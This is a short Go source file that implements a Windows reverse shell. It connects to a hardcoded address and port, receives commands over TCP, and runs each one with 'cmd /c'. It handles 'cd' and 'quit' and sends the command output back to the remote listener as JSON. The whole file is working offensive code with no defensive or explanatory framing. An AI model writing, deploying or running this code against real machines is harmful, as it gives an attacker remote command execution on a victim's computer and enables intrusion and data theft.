package main

import (
	"encoding/json"
	"fmt"
	"net"
	"time"
	"bytes"
	"os/exec"
	"os"
)

func main() {

	command := ""
	conn, err := net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))

	if err != nil {
		fmt.Println("Nope exiting", conn)
		return
	}

	shell(conn, command)
}

func shell(conn net.Conn, command string) {

for{

	command = recieve_data(conn)

	_command := ""

	for i:=1; i<len(command)-1; i++{
		_command += string(command[i])
	}

	if _command == "quit"{
		return 
	}else if (len(_command) >= 3 &&_command[:3] == "cd "){
		os.Chdir(_command[3:])
	}
		send_data(conn, basic_commants(_command))	
}
}

func send_data(conn net.Conn, command_output string) {
	jsondata, _ := json.Marshal(command_output)
	conn.Write([]byte(jsondata))
}

func recieve_data(conn net.Conn) string {

	var buffer []byte = make([]byte, 1024)
	cargo, _ := conn.Read(buffer)

	return string(buffer[:cargo])

}

func basic_commants(command string) string{

	cmd := exec.Command("cmd", "/c", command)
	
	cmd.Dir = "."
	
	str, _ := cmd.Output()

	return string(bytes.ReplaceAll(str,[]byte{10}, []byte{32}))
}
